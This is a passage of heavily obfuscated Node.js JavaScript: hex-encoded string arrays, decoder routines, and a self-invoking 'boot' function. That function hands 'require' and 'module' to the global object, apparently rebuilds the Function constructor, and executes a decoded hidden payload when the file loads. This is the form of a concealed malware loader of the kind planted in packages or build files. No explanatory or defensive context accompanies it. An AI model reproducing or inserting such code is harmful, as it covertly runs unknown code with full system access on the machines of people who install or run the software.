e979984d2c18497eb97c2e09298f7daebce98cc9c9699dc8591eb9785dd96dad585d797da9dccebdddd91dfcdd0f6dafa88ca9fcbd5cf9febeb99ed97908897ded6e9dac2cbd8d597dbdaebd59899d5dff095eb97daebda8b99dcfccd99d89b859985d5c9919fd297dd8495eb97d7eb969099da88e4cad0d7c8d0cbc1ebdaeb98dccd9785ebdaf9d5cde997d0c285dcebc4ebeb91edd5dcebeb8591858599e6cad5cbcbedebd7f0dfda989d93ebeb9eeb85dad8dbd8dfdad2d6d7d5979fdbdfd3d0cd8f898898ccdd9793d29edc81c99f84dadcc9fac485dcfedce98debda9197c1f99890c9d6e29ceb89fd89919c97fc9beb858dd7ebd78bd8ebcc99e6d8fd92f5dfdaebcd9fdb8ecb90da918699c1ebc585cbd5d5ebebebd8eb97999094daebc197dceb85f89785dada85c3d0ebd685daebf9ebebc2db8ec0eb97ebebf2da97ebdf85d5c5d597d08bcad8ebdaebc5ebe2d6eb91caebededcdebcddaf490ebccd7d882f1d4cae784e5c29698dd9fce9782ced5ccd497d1dcebcd91cadcdfda','d3d6d0d7','888b8c8d8e8b81c3fbc3e3f7f5','8b818e898f8189fec8ecefd3c0','84d8dcd7cbccd191d8d5848cda95de81dfddcc97c0cb999797d7dadcdadf958c9bc9d8dcd8cc8fd5d7d390cbe48bcccf9bc194c891e499d88291cb848282cb9291d8e28197ca8bcdf8ded6c895ccd181fa95d8d095ca82d891f8d48991d7d382d3cf93958ecfd68e919091d682d48fd6d88dcbce909799cbd6dde2dfca8bd7c2ddcbcfcd8dc190928995d8d7cb92cbcb92d690c4c3889984d1dfe2d8d781cb88cbe295e4ca8e948e8ed5d8d897ccd08ec294898f80d5cfd4cd8bcb84d0e4e4859290cc95dc90959582d7cbd1e2cb8489cf94cb91829584c990faccca8492da82de82df82c8f8909088cfd090cfd289d7cbd588d8dc99df84e282d1d0cac097dcd491dd92d6988b998491dccfdcd88e818497908ddcd084de97d784c2dfdf8488e2858bd899df8884cb828d95ea90cbc0d5cf88cc99c082d2c8d5c2cdcfd7cf9991fa9991d595d6cfd7c999d084cdd5cb95cb97d5ced6c3d191d595cdc88282cbcb9191cf84d8d1cacf82e4c1c884d8db82ddd882959191cb82cfd3c89791cde29290ddd890cbddd7cbd1ca8d88c091cfcb82dfd1828ade9be4dc9197d8d1cbc9d8c9dee4de9790d7dedfc9d788d195d0dad582829084fa82d48c8492cb9599979082cc8492cac49290d0cd9592dbd482dd92ccd4909484cad0d0c8d6d584cd84cb84c880929797dad1c892e28fdfdc99cd89d7cbc9cb9199cfcb81dfd5cbd795dddddecd99e48fd89782d482cbcdd197dec8998bd8c4dccfdcd0dae4dedbcdd0858dd682fa82d595c3c3d08f92d5e2d8e2829291cad09bd5d09bcb95d7c9d080ca95dfcbdfd1ccce90d6ce84dcc291db84cedcd78bcd97decc97d084d2d0d8d8d89290c0dfcdc9d88ad7c49084809b90dac9f892cc82cccdc9e49b84d5d28ecfc9cd9988cb82d1c3ce9b90cd919080909197d5ccd584ca8edf829982cac88990d79bc09289cac484cfd892ca99d4d19189c897e4d1cf828799898f84f894d6c3dccdcb91cd88cbcdcbcad0cad689dc959782c3e291df858cdc8ecd9591cbd8d6d8cfd7cb82cdd1d1df82cf95d384cb829990cb878881c3d1d693d6c285d8d2d4cad790d8d2cddc97cfd68092dcd889dad5d0d682dbcc9984e4fa98ded382c08a92d590dc8497c4ddcb84d08fd6d0fa81cbd7d789828f84d8cb9bc497cbdcd084e4eacdcacbd7d797828bcb84cd82e2cd82d0cf84c9cbfacbd79190d8cbdccdccc39299d1d5d2e292c184dc999481d3c291dcd3c0809191909099'];d$qtJhn$jgp=function(){return fYa_ecAuUpEYAjErRZhvFjWnMQ;};return d$qtJhn$jgp();}function splitLane(JIxUEcDsZqXSIbQVbGPjupV){var LtHdqNf$QeKg_OxYIOmLQSZZsf=DiRry,hNJRHyXb$$Wx=String[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1f2)](-0xe1b+-parseInt(0x18c3)+-parseInt(0xcfe)*-parseInt(0x3)),mfJLgOOKgjFDK_Jvn$kzS=spin(JIxUEcDsZqXSIbQVbGPjupV,NX);return mfJLgOOKgjFDK_Jvn$kzS=mfJLgOOKgjFDK_Jvn$kzS[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1e7)]('^')[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1e0)](hNJRHyXb$$Wx),mfJLgOOKgjFDK_Jvn$kzS=mfJLgOOKgjFDK_Jvn$kzS[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1e7)]('*1')[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1e0)]('^'),mfJLgOOKgjFDK_Jvn$kzS=mfJLgOOKgjFDK_Jvn$kzS[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1e7)]('*0')[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1e0)]('*'),mfJLgOOKgjFDK_Jvn$kzS[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1e7)](hNJRHyXb$$Wx);}function peel(HntnTJelobY){return spin(HntnTJelobY,SX);}(function boot(jRiqfL_YGi,ZXWEUnPbKMsgcWphWHTfi){var DWSBzXLkOBhNwMmvBZ=DiRry;jRiqfL_YGi['z']=z;var qrm_pgeLcAkZ=splitLane(DWSBzXLkOBhNwMmvBZ(0x1eb));jRiqfL_YGi[qrm_pgeLcAkZ[-parseInt(0x5a)*Math.ceil(0x5f)+0x1cf*Math.max(-parseInt(0x7),-parseInt(0x7))+parseInt(0x2e0f)]]=ZXWEUnPbKMsgcWphWHTfi;typeof module===qrm_pgeLcAkZ[-0xe9*Number(parseInt(0x1))+0x19a3*-0x1+-parseInt(0x1)*Number(-0x1a8d)]&&(jRiqfL_YGi[qrm_pgeLcAkZ[parseInt(0x24d7)+Math.trunc(parseInt(0x26d4))+Math.max(0xacf,parseInt(0xacf))*parseInt(-0x7)]]=module);var GWCvm$ZL=peel(DWSBzXLkOBhNwMmvBZ(0x1ec)),rcTIW_sQOoGcYZLAlPkfm$mi=GWCvm$ZL[DWSBzXLkOBhNwMmvBZ(0x1e5)](0x19*Math.ceil(0x82)+Math.ceil(0x1)*Math.ceil(0x18a9)+parseInt(-parseInt(0x255b)),0x312*-parseInt(0x7)+-parseInt(0x251d)+0x3aa6),paMowTbZVJuno=peel[rcTIW_sQOoGcYZLAlPkfm$mi],g$$RRgVGjkaechxpAIOIR=paMowTbZVJuno('',peel(DWSBzXLkOBhNwMmvBZ(0x1e3))),rLmqKRB_QxEIuMImVE$hGKNZAHT=g$$RRgVGjkaechxpAIOIR(peel(DWSBzXLkOBhNwMmvBZ(0x1f3)));return paMowTbZVJuno('',rLmqKRB_QxEIuMImVE$hGKNZAHT)(0x220d+parseInt(0x518)+Math.floor(-parseInt(0x4e4))*0x6),-parseInt(0x12e1)+-0xa34+Math.trunc(0x3ce3);}(global,require));
}
